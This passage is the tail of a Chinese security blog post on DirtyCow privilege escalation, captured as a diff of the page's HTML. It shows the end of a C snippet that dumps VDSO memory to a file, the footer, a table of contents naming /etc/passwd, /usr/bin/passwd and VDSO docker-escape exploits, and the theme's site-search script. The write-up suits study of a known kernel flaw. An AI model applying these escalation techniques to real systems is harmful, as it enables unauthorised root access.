class="number">-1</span>)</span><br><span class="line">		err(<span class="number">1</span>, <span class="string">&quot;open&quot;</span>);</span><br><span class="line"></span><br><span class="line">	write(fd, (<span class="keyword">void</span> *)vdso_addr, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+</li>
+</ol>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-to-root/">http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-to-root/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2023/05/02/230501-dirtycow-analysis/"><span class="paginator-prev__text">经典内核漏洞复现之dirtycow</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Edirtycow%E7%9A%84%E5%87%A0%E7%A7%8D%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">
+          基于dirtycow的几种提权思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-etc-passwd%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">
+          利用&#x2F;etc&#x2F;passwd提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">
+          exp分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E9%AA%8C%E8%AF%81"><span class="toc-number">2.2.</span> <span class="toc-text">
+          exp验证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-usr-bin-passwd%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">
+          利用&#x2F;usr&#x2F;bin&#x2F;passwd提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">
+          exp分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E9%AA%8C%E8%AF%81-1"><span class="toc-number">3.2.</span> <span class="toc-text">
+          exp验证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8VDSO%E5%AE%8C%E6%88%90docker%E9%80%83%E9%80%B8"><span class="toc-number">4.</span> <span class="toc-text">
+          利用VDSO完成docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E5%88%86%E6%9E%90-2"><span class="toc-number">4.1.</span> <span class="toc-text">
+          exp分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E9%AA%8C%E8%AF%81-2"><span class="toc-number">4.2.</span> <span class="toc-text">
+          exp验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">4.3.</span> <span class="toc-text">
+          拓展</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">
+          知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFvdso"><span class="toc-number">5.1.</span> <span class="toc-text">
+          什么是vdso</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E6%9C%89vsyscall"><span class="toc-number">5.1.1.</span> <span class="toc-text">
+          先有vsyscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%9C%89vdso"><span class="toc-number">5.1.2.</span> <span class="toc-text">
+          再有vdso</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAvdso"><span class="toc-number">5.1.3.</span> <span class="toc-text">
+          导出vdso</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">62</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">12</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">34</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="访问人数"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="浏览总量"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
